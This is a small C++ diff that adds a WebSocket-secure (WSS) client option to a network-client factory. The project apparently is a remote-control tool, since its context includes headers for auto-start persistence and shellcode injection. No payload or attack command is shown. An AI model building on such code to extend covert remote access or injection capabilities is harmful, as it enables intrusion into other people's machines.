@@ -15,6 +15,7 @@
 #include <common/iniFile.h>
 #include "IOCPUDPClient.h"
 #include "IOCPKCPClient.h"
+#include "WSSClient.h"
 #include "auto_start.h"
 #include "ShellcodeInj.h"
 
@@ -30,6 +31,8 @@ IOCPClient* NewNetClient(CONNECT_ADDRESS* conn, State& bExit, const std::string&
         return new IOCPUDPClient(bExit, exit_while_disconnect);
     if (type == PROTO_HTTP || type == PROTO_HTTPS)
         return new IOCPClient(bExit, exit_while_disconnect, MaskTypeHTTP, conn->GetHeaderEncType(), publicIP);
+    if (type == PROTO_WSS)
+        return new WSSClient(bExit, exit_while_disconnect, MaskTypeNone, conn->GetHeaderEncType(), publicIP);
     if (type == PROTO_KCP) {
         return new IOCPKCPClient(bExit, exit_while_disconnect);
     }
